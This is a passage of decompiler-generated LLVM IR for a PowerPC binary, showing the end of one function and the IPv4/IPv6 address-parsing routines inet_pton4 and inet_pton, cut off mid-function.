  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001d72c

dec_label_pc_1001d72c:                            ; preds = %dec_label_pc_1001d710, %dec_label_pc_1001d704, %dec_label_pc_1001d6d8, %dec_label_pc_1001d560, %dec_label_pc_1001d720, %dec_label_pc_1001d6f0, %dec_label_pc_1001d69c, %dec_label_pc_1001d728
  %v0_1001d73c = phi i32 [ %v1_1001d718, %dec_label_pc_1001d710 ], [ 0, %dec_label_pc_1001d704 ], [ -6, %dec_label_pc_1001d6d8 ], [ -8, %dec_label_pc_1001d560 ], [ -2, %dec_label_pc_1001d720 ], [ %v0_1001d73c.pre, %dec_label_pc_1001d6f0 ], [ %v1_1001d6a0, %dec_label_pc_1001d69c ], [ -1, %dec_label_pc_1001d728 ]
  ret i32 %v0_1001d73c

; uselistorder directives
  uselistorder i32 %v0_1001d704, { 1, 0, 2 }
  uselistorder i1 %v0_1001d6d8, { 1, 0 }
  uselistorder i32 %v2_1001d6b8, { 1, 0 }
  uselistorder i1 %v0_1001d620, { 1, 0 }
  uselistorder i32 %v0_1001d5d0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1001d5cc, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_1001d554, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_1001d4fc, { 1, 0, 2, 3 }
  uselistorder i8** %stack_var_-100, { 1, 0 }
  uselistorder i32* %stack_var_-104, { 0, 1, 3, 2 }
  uselistorder i32 %tmp, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 0 }
  uselistorder i32* %r28.global-to-local, { 0, 3, 4, 5, 2, 1, 6 }
  uselistorder i32* %r23.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r22.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r21.global-to-local, { 1, 0, 2, 3 }
  uselistorder i1* %cr7_eq.global-to-local, { 2, 3, 4, 5, 6, 7, 20, 31, 0, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30 }
  uselistorder i32 (i32)* @freeaddrinfo, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_1001d72c, { 7, 4, 0, 1, 5, 2, 6, 3 }
  uselistorder label %dec_label_pc_1001d728, { 1, 0 }
  uselistorder label %dec_label_pc_1001d710, { 1, 0 }
  uselistorder label %dec_label_pc_1001d6c8, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_1001d6c4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001d6b4, { 1, 0 }
  uselistorder label %dec_label_pc_1001d69c, { 1, 0 }
  uselistorder label %dec_label_pc_1001d68c, { 1, 0 }
  uselistorder label %dec_label_pc_1001d648, { 1, 0 }
  uselistorder label %dec_label_pc_1001d620, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001d61c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001d5a4, { 1, 0 }
  uselistorder label %dec_label_pc_1001d57c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001d570, { 1, 0 }
  uselistorder label %dec_label_pc_1001d4dc, { 1, 0 }
  uselistorder label %dec_label_pc_1001d4b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001d494, { 1, 0, 2 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1001d748 = call i32 @__asm_mfcr()
  store i32 %v0_1001d748, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  store i32 0, i32* @r10, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_1001d75c = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1001d75c, i32* %r7.global-to-local, align 4
  store i32 0, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1001d7c0

dec_label_pc_1001d770:                            ; preds = %dec_label_pc_1001d7c0
  %v1_1001d7d4 = add i32 %v0_1001d7d0, -48
  %v2_1001d7d8 = icmp ugt i32 %v1_1001d7d4, 9
  br i1 %v2_1001d7d8, label %dec_label_pc_1001d7ac, label %dec_label_pc_1001d778

dec_label_pc_1001d778:                            ; preds = %dec_label_pc_1001d770
  %v0_1001d778 = load i32, i32* %r7.global-to-local, align 4
  %v1_1001d778 = inttoptr i32 %v0_1001d778 to i8*
  %v2_1001d778 = load i8, i8* %v1_1001d778, align 1
  %v3_1001d778 = zext i8 %v2_1001d778 to i32
  %v1_1001d77c = mul nuw nsw i32 %v3_1001d778, 10
  %v2_1001d780 = add i32 %v1_1001d77c, %v0_1001d7d0
  %v1_1001d784 = add i32 %v2_1001d780, -48
  %v2_1001d788 = icmp ugt i32 %v1_1001d784, 255
  br i1 %v2_1001d788, label %dec_label_pc_1001d808, label %dec_label_pc_1001d790

dec_label_pc_1001d790:                            ; preds = %dec_label_pc_1001d778
  %v1_1001d790 = trunc i32 %v1_1001d784 to i8
  store i8 %v1_1001d790, i8* %v1_1001d778, align 1
  %v0_1001d794 = load i1, i1* @cr4_eq, align 1
  br i1 %v0_1001d794, label %dec_label_pc_1001d798, label %dec_label_pc_1001d7c0.backedge

dec_label_pc_1001d798:                            ; preds = %dec_label_pc_1001d790
  %v0_1001d798 = load i32, i32* @r10, align 4
  %v1_1001d798 = add i32 %v0_1001d798, 1
  store i32 %v1_1001d798, i32* @r10, align 4
  store i32 1, i32* @r8, align 4
  %v2_1001d7a0 = icmp sgt i32 %v1_1001d798, 4
  br i1 %v2_1001d7a0, label %dec_label_pc_1001d808, label %dec_label_pc_1001d7c0.backedge

dec_label_pc_1001d7ac:                            ; preds = %dec_label_pc_1001d770
  %v3_1001d770 = icmp eq i32 %v0_1001d7e4, 4
  store i32 0, i32* @r8, align 4
  %v3_1001d7dc.not = icmp ne i32 %v0_1001d7d0, 46
  %v0_1001d7b4 = load i1, i1* %cr0_eq.global-to-local, align 1
  %brmerge = or i1 %v3_1001d770, %v0_1001d7b4
  %or.cond = or i1 %brmerge, %v3_1001d7dc.not
  br i1 %or.cond, label %dec_label_pc_1001d808, label %dec_label_pc_1001d7bc

dec_label_pc_1001d7bc:                            ; preds = %dec_label_pc_1001d7ac
  %v0_1001d7bc = load i32, i32* %r6.global-to-local, align 4
  %v1_1001d7bc = trunc i32 %v0_1001d7bc to i8
  %v2_1001d7bc = load i32, i32* %r7.global-to-local, align 4
  %v3_1001d7bc = add i32 %v2_1001d7bc, 1
  %v4_1001d7bc = inttoptr i32 %v3_1001d7bc to i8*
  store i8 %v1_1001d7bc, i8* %v4_1001d7bc, align 1
  store i32 %v3_1001d7bc, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1001d7c0.backedge

dec_label_pc_1001d7c0.backedge:                   ; preds = %dec_label_pc_1001d7bc, %dec_label_pc_1001d790, %dec_label_pc_1001d798
  %v0_1001d7c0.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_1001d7c4.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1001d7c0

dec_label_pc_1001d7c0:                            ; preds = %dec_label_pc_1001d7c0.backedge, %entry
  %v0_1001d7c4 = phi i32 [ %v0_1001d7c4.pre, %dec_label_pc_1001d7c0.backedge ], [ 0, %entry ]
  %v0_1001d7c8 = phi i32 [ %v0_1001d7c0.pre, %dec_label_pc_1001d7c0.backedge ], [ %v0_1001d748, %entry ]
  %v1_1001d7c0 = inttoptr i32 %v0_1001d7c8 to i8*
  %v2_1001d7c0 = load i8, i8* %v1_1001d7c0, align 1
  %v3_1001d7c0 = zext i8 %v2_1001d7c0 to i32
  store i32 %v3_1001d7c0, i32* %r11.global-to-local, align 4
  %v1_1001d7c4 = icmp slt i32 %v0_1001d7c4, 0
  %v2_1001d7c4 = icmp sgt i32 %v0_1001d7c4, 0
  %v3_1001d7c4 = icmp eq i32 %v0_1001d7c4, 0
  store i1 %v3_1001d7c4, i1* %cr0_eq.global-to-local, align 1
  %v1_1001d7c8 = add i32 %v0_1001d7c8, 1
  store i32 %v1_1001d7c8, i32* %r3.global-to-local, align 4
  %v4_1001d7cc = call i4 @__asm_mcrf_cr0_read(i1 %v1_1001d7c4, i1 %v2_1001d7c4, i1 %v3_1001d7c4, i1 false)
  %v0_1001d7d0 = load i32, i32* %r11.global-to-local, align 4
  %v3_1001d7d0 = icmp eq i32 %v0_1001d7d0, 0
  %v0_1001d7e4 = load i32, i32* @r10, align 4
  br i1 %v3_1001d7d0, label %dec_label_pc_1001d7e4, label %dec_label_pc_1001d770

dec_label_pc_1001d7e4:                            ; preds = %dec_label_pc_1001d7c0
  %tmp9 = icmp slt i32 %v0_1001d7e4, 4
  br i1 %tmp9, label %dec_label_pc_1001d808, label %dec_label_pc_1001d7ec

dec_label_pc_1001d7ec:                            ; preds = %dec_label_pc_1001d7e4
  store i32 %arg1, i32* @r3, align 4
  store i32 4, i32* @r5, align 4
  store i32 %v2_1001d75c, i32* @r4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1001d7fc.1195 to i32), i32* @lr, align 4
  %v0_1001d7f8 = call i32 @memcpy()
  br label %dec_label_pc_1001d808

dec_label_pc_1001d808:                            ; preds = %dec_label_pc_1001d7ac, %dec_label_pc_1001d778, %dec_label_pc_1001d798, %dec_label_pc_1001d7e4, %dec_label_pc_1001d7ec
  %storemerge = phi i32 [ 1, %dec_label_pc_1001d7ec ], [ 0, %dec_label_pc_1001d7e4 ], [ 0, %dec_label_pc_1001d798 ], [ 0, %dec_label_pc_1001d778 ], [ 0, %dec_label_pc_1001d7ac ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v1_1001d818 = call %0 @__asm_mtcrf(i32 8, i32 %v0_1001d748)
  %v4_1001d818 = extractvalue %0 %v1_1001d818, 2
  store i1 %v4_1001d818, i1* %cr0_eq.global-to-local, align 1
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_1001d7d0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1001d7c4, { 2, 1, 0 }
  uselistorder i32 %v0_1001d748, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 2, 0 }
  uselistorder i1* %cr0_eq.global-to-local, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1001d808, { 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_1001d7c0.backedge, { 0, 2, 1 }
}

define i32 @inet_pton(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1001d824 = load i32, i32* @lr, align 4
  store i32 %v0_1001d824, i32* %r0.global-to-local, align 4
  %v3_1001d828 = icmp eq i32 %arg1, 2
  %v0_1001d830 = load i32, i32* @r4, align 4
  store i32 %v0_1001d830, i32* @r29, align 4
  %v0_1001d838 = load i32, i32* @r5, align 4
  store i32 %v0_1001d838, i32* @r22, align 4
  br i1 %v3_1001d828, label %dec_label_pc_1001d84c, label %dec_label_pc_1001d840

dec_label_pc_1001d840:                            ; preds = %entry
  %v3_1001d840 = icmp eq i32 %arg1, 10
  br i1 %v3_1001d840, label %dec_label_pc_1001d860, label %dec_label_pc_1001d9fc

dec_label_pc_1001d84c:                            ; preds = %entry
  store i32 %v0_1001d830, i32* %r3.global-to-local, align 4
  store i32 268556376, i32* @lr, align 4
  %v2_1001d854 = call i32 @inet_pton4(i32 %v0_1001d830, i32 %v0_1001d838)
  store i32 %v2_1001d854, i32* %r3.global-to-local, align 4
  store i32 %v2_1001d854, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1001da14

dec_label_pc_1001d860:                            ; preds = %dec_label_pc_1001d840
  %v2_1001d860 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1001d860, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 16, i32* @r5, align 4
  store i32 268556400, i32* @lr, align 4
  %v0_1001d86c = call i32 @__GI_memset()
  store i32 %v0_1001d86c, i32* %r3.global-to-local, align 4
  %v0_1001d870 = load i32, i32* @r29, align 4
  %v1_1001d870 = inttoptr i32 %v0_1001d870 to i8*
  %v2_1001d870 = load i8, i8* %v1_1001d870, align 1
  %v3_1001d870 = zext i8 %v2_1001d870 to i32
  store i32 %v3_1001d870, i32* %r0.global-to-local, align 4
  store i32 %v0_1001d86c, i32* @r31, align 4
  %v2_1001d878 = add i32 %v0_1001d86c, 16
  store i32 %v2_1001d878, i32* @r27, align 4
  %v3_1001d87c = icmp eq i8 %v2_1001d870, 58
  br i1 %v3_1001d87c, label %dec_label_pc_1001d884, label %dec_label_pc_1001d890

dec_label_pc_1001d884:                            ; preds = %dec_label_pc_1001d860
  %v1_1001d884 = add i32 %v0_1001d870, 1
  %v2_1001d884 = inttoptr i32 %v1_1001d884 to i8*
  %v3_1001d884 = load i8, i8* %v2_1001d884, align 1
  %v4_1001d884 = zext i8 %v3_1001d884 to i32
  store i32 %v4_1001d884, i32* %r0.global-to-local, align 4
  store i32 %v1_1001d884, i32* @r29, align 4
  %v3_1001d888 = icmp eq i8 %v3_1001d884, 58
  br i1 %v3_1001d888, label %dec_label_pc_1001d890, label %dec_label_pc_1001da10

dec_label_pc_1001d890:                            ; preds = %dec_label_pc_1001d884, %dec_label_pc_1001d860
  %v0_1001d890 = phi i32 [ %v1_1001d884, %dec_label_pc_1001d884 ], [ %v0_1001d870, %dec_label_pc_1001d860 ]
  store i32 %v0_1001d890, i32* @r26, align 4
  store i32 0, i32* @r24, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_1001d9642935 = inttoptr i32 %v0_1001d890 to i8*
  %v2_1001d9643036 = load i8, i8* %v1_1001d9642935, align 1
  %v3_1001d9643137 = zext i8 %v2_1001d9643036 to i32
  store i32 %v3_1001d9643137, i32* %r3.global-to-local, align 4
  store i32 268556652, i32* @lr, align 4
  %v1_1001d9683238 = call i32 @__GI_tolower(i32 %v3_1001d9643137)
  store i32 %v1_1001d9683238, i32* %r3.global-to-local, align 4
  store i32 %v1_1001d9683238, i32* @r30, align 4
  %v3_1001d96c3339 = icmp eq i32 %v1_1001d9683238, 0
  br i1 %v3_1001d96c3339, label %dec_label_pc_1001d974, label %dec_label_pc_1001d89c.lr.ph

dec_label_pc_1001d89c:                            ; preds = %dec_label_pc_1001d89c.lr.ph, %dec_label_pc_1001d964.backedge
  %v1_1001d96834 = phi i32 [ %v1_1001d9683240, %dec_label_pc_1001d89c.lr.ph ], [ %v1_1001d968, %dec_label_pc_1001d964.backedge ]
  store i32 ptrtoint ([13 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_1002f05c.1196 to i32), i32* @r25, align 4
  %v0_1001d8a8 = load i32, i32* @r29, align 4
  %v1_1001d8a8 = add i32 %v0_1001d8a8, 1
  store i32 %v1_1001d8a8, i32* @r29, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_1002f05c.1196 to i32), i32* @r3, align 4
  store i32 268556468, i32* @lr, align 4
  %v3_1001d8b0 = call i32 @__GI_strchr(i32 ptrtoint ([17 x i8]* @global_var_1002f05c.1196 to i32), i32 %v1_1001d96834)
  store i32 %v3_1001d8b0, i32* %r3.global-to-local, align 4
  %v3_1001d8b4 = icmp eq i32 %v3_1001d8b0, 0
  br i1 %v3_1001d8b4, label %dec_label_pc_1001d8d4, label %dec_label_pc_1001d8bc

dec_label_pc_1001d8bc:                            ; preds = %dec_label_pc_1001d89c
  %v0_1001d8bc = load i32, i32* @r25, align 4
  %v2_1001d8bc = sub i32 %v3_1001d8b0, %v0_1001d8bc
  store i32 %v2_1001d8bc, i32* %r0.global-to-local, align 4
  %v0_1001d8c0 = load i32, i32* @r28, align 4
  %v1_1001d8c0 = mul i32 %v0_1001d8c0, 16
  store i32 %v1_1001d8c0, i32* %r9.global-to-local, align 4
  %v2_1001d8c4 = or i32 %v1_1001d8c0, %v2_1001d8bc
  store i32 %v2_1001d8c4, i32* @r28, align 4
  %tmp18 = icmp ult i32 %v2_1001d8c4, 65536
  br i1 %tmp18, label %dec_label_pc_1001d960, label %dec_label_pc_1001da10

dec_label_pc_1001d8d4:                            ; preds = %dec_label_pc_1001d89c
  %v0_1001d8d4 = load i32, i32* @r30, align 4
  %v3_1001d8d4 = icmp eq i32 %v0_1001d8d4, 58
  br i1 %v3_1001d8d4, label %dec_label_pc_1001d8dc, label %dec_label_pc_1001d930

dec_label_pc_1001d8dc:                            ; preds = %dec_label_pc_1001d8d4
  %v0_1001d8dc = load i32, i32* @r23, align 4
  %v3_1001d8dc = icmp eq i32 %v0_1001d8dc, 0
  br i1 %v3_1001d8dc, label %dec_label_pc_1001d8e4, label %dec_label_pc_1001d8f8

dec_label_pc_1001d8e4:                            ; preds = %dec_label_pc_1001d8dc
  %v0_1001d8e4 = load i32, i32* @r24, align 4
  %v3_1001d8e4 = icmp eq i32 %v0_1001d8e4, 0
  br i1 %v3_1001d8e4, label %dec_label_pc_1001d8ec, label %dec_label_pc_1001da10

dec_label_pc_1001d8ec:                            ; preds = %dec_label_pc_1001d8e4
  %v0_1001d8ec = load i32, i32* @r31, align 4
  store i32 %v0_1001d8ec, i32* @r24, align 4
  %v0_1001d8f0 = load i32, i32* @r29, align 4
  store i32 %v0_1001d8f0, i32* @r26, align 4
  br label %dec_label_pc_1001d964.backedge

dec_label_pc_1001d8f8:                            ; preds = %dec_label_pc_1001d8dc
  %v0_1001d8f8 = load i32, i32* @r29, align 4
  %v1_1001d8f8 = inttoptr i32 %v0_1001d8f8 to i8*
  %v2_1001d8f8 = load i8, i8* %v1_1001d8f8, align 1
  %v3_1001d8f8 = zext i8 %v2_1001d8f8 to i32
  store i32 %v3_1001d8f8, i32* %r0.global-to-local, align 4
  %v3_1001d8fc = icmp eq i8 %v2_1001d8f8, 0
  br i1 %v3_1001d8fc, label %dec_label_pc_1001da10, label %dec_label_pc_1001d904

dec_label_pc_1001d904:                            ; preds = %dec_label_pc_1001d8f8
  %v0_1001d904 = load i32, i32* @r31, align 4
  %v1_1001d904 = add i32 %v0_1001d904, 2
  store i32 %v1_1001d904, i32* %r0.global-to-local, align 4
  %v1_1001d908 = load i32, i32* @r27, align 4
  %v3_1001d908 = icmp ugt i32 %v1_1001d904, %v1_1001d908
  br i1 %v3_1001d908, label %dec_label_pc_1001da10, label %dec_label_pc_1001d910

dec_label_pc_1001d910:                            ; preds = %dec_label_pc_1001d904
  %v0_1001d910 = load i32, i32* @r28, align 4
  %v1_1001d910 = udiv i32 %v0_1001d910, 256
  store i32 %v1_1001d910, i32* %r0.global-to-local, align 4
  %v1_1001d914 = trunc i32 %v0_1001d910 to i8
  %v3_1001d914 = add i32 %v0_1001d904, 1
  %v4_1001d914 = inttoptr i32 %v3_1001d914 to i8*
  store i8 %v1_1001d914, i8* %v4_1001d914, align 1
  %v0_1001d918 = load i32, i32* %r0.global-to-local, align 4
  %v1_1001d918 = trunc i32 %v0_1001d918 to i8
  %v2_1001d918 = load i32, i32* @r31, align 4
  %v3_1001d918 = inttoptr i32 %v2_1001d918 to i8*
  store i8 %v1_1001d918, i8* %v3_1001d918, align 1
  %v0_1001d91c = load i32, i32* @r29, align 4
  store i32 %v0_1001d91c, i32* @r26, align 4
  %v0_1001d920 = load i32, i32* @r31, align 4
  %v1_1001d920 = add i32 %v0_1001d920, 2
  store i32 %v1_1001d920, i32* @r31, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_1001d96429 = inttoptr i32 %v0_1001d91c to i8*
  %v2_1001d96430 = load i8, i8* %v1_1001d96429, align 1
  %v3_1001d96431 = zext i8 %v2_1001d96430 to i32
  store i32 %v3_1001d96431, i32* %r3.global-to-local, align 4
  store i32 268556652, i32* @lr, align 4
  %v1_1001d96832 = call i32 @__GI_tolower(i32 %v3_1001d96431)
  store i32 %v1_1001d96832, i32* %r3.global-to-local, align 4
  store i32 %v1_1001d96832, i32* @r30, align 4
  %v3_1001d96c33 = icmp eq i32 %v1_1001d96832, 0
  br i1 %v3_1001d96c33, label %dec_label_pc_1001d974, label %dec_label_pc_1001d89c.lr.ph

dec_label_pc_1001d89c.lr.ph:                      ; preds = %dec_label_pc_1001d890, %dec_label_pc_1001d910
  %v1_1001d9683240 = phi i32 [ %v1_1001d96832, %dec_label_pc_1001d910 ], [ %v1_1001d9683238, %dec_label_pc_1001d890 ]
  br label %dec_label_pc_1001d89c

dec_label_pc_1001d930:                            ; preds = %dec_label_pc_1001d8d4
  %v3_1001d930 = icmp eq i32 %v0_1001d8d4, 46
  br i1 %v3_1001d930, label %dec_label_pc_1001d938, label %dec_label_pc_1001da10

dec_label_pc_1001d938:                            ; preds = %dec_label_pc_1001d930
  %v0_1001d938 = load i32, i32* @r31, align 4
  %v1_1001d938 = add i32 %v0_1001d938, 4
  store i32 %v1_1001d938, i32* @r30, align 4
  %v1_1001d93c = load i32, i32* @r27, align 4
  %v3_1001d93c = icmp ugt i32 %v1_1001d938, %v1_1001d93c
  br i1 %v3_1001d93c, label %dec_label_pc_1001da10, label %dec_label_pc_1001d944

dec_label_pc_1001d944:                            ; preds = %dec_label_pc_1001d938
  %v0_1001d948 = load i32, i32* @r26, align 4
  store i32 %v0_1001d948, i32* %r3.global-to-local, align 4
  store i32 268556624, i32* @lr, align 4
  %v2_1001d94c = call i32 @inet_pton4(i32 %v0_1001d948, i32 %v0_1001d938)
  store i32 %v2_1001d94c, i32* %r3.global-to-local, align 4
  %v0_1001d950 = load i32, i32* @r30, align 4
  store i32 %v0_1001d950, i32* @r31, align 4
  %v2_1001d954 = icmp sgt i32 %v2_1001d94c, 0
  br i1 %v2_1001d954, label %dec_label_pc_1001d998, label %dec_label_pc_1001da10

dec_label_pc_1001d960:                            ; preds = %dec_label_pc_1001d8bc
  store i32 1, i32* @r23, align 4
  %v0_1001d964.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1001d964.backedge

dec_label_pc_1001d964.backedge:                   ; preds = %dec_label_pc_1001d960, %dec_label_pc_1001d8ec
  %v0_1001d964.be = phi i32 [ %v0_1001d964.pre.pre, %dec_label_pc_1001d960 ], [ %v0_1001d8f0, %dec_label_pc_1001d8ec ]
  %v1_1001d964 = inttoptr i32 %v0_1001d964.be to i8*
  %v2_1001d964 = load i8, i8* %v1_1001d964, align 1
  %v3_1001d964 = zext i8 %v2_1001d964 to i32
  store i32 %v3_1001d964, i32* %r3.global-to-local, align 4
  store i32 268556652, i32* @lr, align 4
  %v1_1001d968 = call i32 @__GI_tolower(i32 %v3_1001d964)
  store i32 %v1_1001d968, i32* %r3.global-to-local, align 4
  store i32 %v1_1001d968, i32* @r30, align 4
  %v3_1001d96c = icmp eq i32 %v1_1001d968, 0
  br i1 %v3_1001d96c, label %dec_label_pc_1001d974, label %dec_label_pc_1001d89c

dec_label_pc_1001d974:                            ; preds = %dec_label_pc_1001d964.backedge, %dec_label_pc_1001d890, %dec_label_pc_1001d910
  %v0_1001d974 = load i32, i32* @r23, align 4
  %v3_1001d974 = icmp eq i32 %v0_1001d974, 0
  %v0_1001d9dc.pre.pre = load i32, i32* @r31, align 4
  br i1 %v3_1001d974, label %dec_label_pc_1001d998, label %dec_label_pc_1001d97c

dec_label_pc_1001d97c:                            ; preds = %dec_label_pc_1001d974
  %v1_1001d97c = add i32 %v0_1001d9dc.pre.pre, 2
  store i32 %v1_1001d97c, i32* %r0.global-to-local, align 4
  %v1_1001d980 = load i32, i32* @r27, align 4
  %v3_1001d980 = icmp ugt i32 %v1_1001d97c, %v1_1001d980
  br i1 %v3_1001d980, label %dec_label_pc_1001da10, label %dec_label_pc_1001d988

dec_label_pc_1001d988:                            ; preds = %dec_label_pc_1001d97c
  %v0_1001d988 = load i32, i32* @r28, align 4
  %v1_1001d988 = udiv i32 %v0_1001d988, 256
  store i32 %v1_1001d988, i32* %r0.global-to-local, align 4
  %v1_1001d98c = trunc i32 %v0_1001d988 to i8
  %v3_1001d98c = add i32 %v0_1001d9dc.pre.pre, 1
  %v4_1001d98c = inttoptr i32 %v3_1001d98c to i8*
  store i8 %v1_1001d98c, i8* %v4_1001d98c, align 1
  %v0_1001d990 = load i32, i32* %r0.global-to-local, align 4
  %v1_1001d990 = trunc i32 %v0_1001d990 to i8
  %v2_1001d990 = load i32, i32* @r31, align 4
  %v3_1001d990 = inttoptr i32 %v2_1001d990 to i8*
  store i8 %v1_1001d990, i8* %v3_1001d990, align 1
  %v0_1001d994 = load i32, i32* @r31, align 4
  %v1_1001d994 = add i32 %v0_1001d994, 2
  store i32 %v1_1001d994, i32* @r31, align 4
  br label %dec_label_pc_1001d998

dec_label_pc_1001d998:                            ; preds = %dec_label_pc_1001d974, %dec_label_pc_1001d944, %dec_label_pc_1001d988
  %v0_1001d9dc.pre = phi i32 [ %v0_1001d950, %dec_label_pc_1001d944 ], [ %v1_1001d994, %dec_label_pc_1001d988 ], [ %v0_1001d9dc.pre.pre, %dec_label_pc_1001d974 ]
  %v0_1001d998 = load i32, i32* @r24, align 4
  %v3_1001d998 = icmp eq i32 %v0_1001d998, 0
  %v1_1001d9dc.pre = load i32, i32* @r27, align 4
  %v4_1001d9dc = icmp eq i32 %v0_1001d9dc.pre, %v1_1001d9dc.pre
  br i1 %v3_1001d998, label %dec_label_pc_1001d9dc, label %dec_label_pc_1001d9a0

dec_label_pc_1001d9a0:                            ; preds = %dec_label_pc_1001d998
  %v2_1001d9a4 = sub i32 %v0_1001d9dc.pre, %v0_1001d998
  store i32 %v2_1001d9a4, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  br i1 %v4_1001d9dc, label %dec_label_pc_1001da10, label %dec_label_pc_1001d9c4.preheader

dec_label_pc_1001d9c4.preheader:                  ; preds = %dec_label_pc_1001d9a0
  %v3_1001d9c423 = icmp slt i32 %v2_1001d9a4, 1
  %v2_1001d9c825 = add i32 %v2_1001d9a4, -1
  store i32 %v2_1001d9c825, i32* %r11.global-to-local, align 4
  %v2_1001d9cc26 = add i32 %v1_1001d9dc.pre, -1
  store i32 %v2_1001d9cc26, i32* @r10, align 4
  store i32 2, i32* %r9.global-to-local, align 4
  br i1 %v3_1001d9c423, label %dec_label_pc_1001d9dc.thread, label %dec_label_pc_1001d9b8

dec_label_pc_1001d9b8:                            ; preds = %dec_label_pc_1001d9c4.preheader, %dec_label_pc_1001d9b8.dec_label_pc_1001d9b8_crit_edge
  %v0_1001d9b8 = phi i32 [ %v0_1001d9b8.pre, %dec_label_pc_1001d9b8.dec_label_pc_1001d9b8_crit_edge ], [ %v0_1001d998, %dec_label_pc_1001d9c4.preheader ]
  %v2_1001d9cc28 = phi i32 [ %v2_1001d9cc, %dec_label_pc_1001d9b8.dec_label_pc_1001d9b8_crit_edge ], [ %v2_1001d9cc26, %dec_label_pc_1001d9c4.preheader ]
  %v2_1001d9c827 = phi i32 [ %v2_1001d9c8, %dec_label_pc_1001d9b8.dec_label_pc_1001d9b8_crit_edge ], [ %v2_1001d9c825, %dec_label_pc_1001d9c4.preheader ]
  %v2_1001d9b8 = add i32 %v0_1001d9b8, %v2_1001d9c827
  %v3_1001d9b8 = inttoptr i32 %v2_1001d9b8 to i8*
  %v4_1001d9b8 = load i8, i8* %v3_1001d9b8, align 1
  %v5_1001d9b8 = zext i8 %v4_1001d9b8 to i32
  store i32 %v5_1001d9b8, i32* %r0.global-to-local, align 4
  %v3_1001d9bc = inttoptr i32 %v2_1001d9cc28 to i8*
  store i8 %v4_1001d9b8, i8* %v3_1001d9bc, align 1
  %v0_1001d9c0 = load i32, i32* @r8, align 4
  %v1_1001d9c0 = load i32, i32* @r24, align 4
  %v2_1001d9c0 = load i32, i32* %r11.global-to-local, align 4
  %v3_1001d9c0 = trunc i32 %v0_1001d9c0 to i8
  %v4_1001d9c0 = add i32 %v2_1001d9c0, %v1_1001d9c0
  %v5_1001d9c0 = inttoptr i32 %v4_1001d9c0 to i8*
  store i8 %v3_1001d9c0, i8* %v5_1001d9c0, align 1
  %v0_1001d9c4.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_1001d9c4.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_1001d9cc.pre = load i32, i32* @r27, align 4
  %v3_1001d9c4 = icmp slt i32 %v1_1001d9c4.pre, %v0_1001d9c4.pre
  %v2_1001d9c8 = sub i32 %v1_1001d9c4.pre, %v0_1001d9c4.pre
  store i32 %v2_1001d9c8, i32* %r11.global-to-local, align 4
  %v2_1001d9cc = sub i32 %v1_1001d9cc.pre, %v0_1001d9c4.pre
  store i32 %v2_1001d9cc, i32* @r10, align 4
  %v1_1001d9d0 = add i32 %v0_1001d9c4.pre, 1
  store i32 %v1_1001d9d0, i32* %r9.global-to-local, align 4
  br i1 %v3_1001d9c4, label %dec_label_pc_1001d9dc.thread, label %dec_label_pc_1001d9b8.dec_label_pc_1001d9b8_crit_edge

dec_label_pc_1001d9b8.dec_label_pc_1001d9b8_crit_edge: ; preds = %dec_label_pc_1001d9b8
  %v0_1001d9b8.pre = load i32, i32* @r24, align 4
  br label %dec_label_pc_1001d9b8

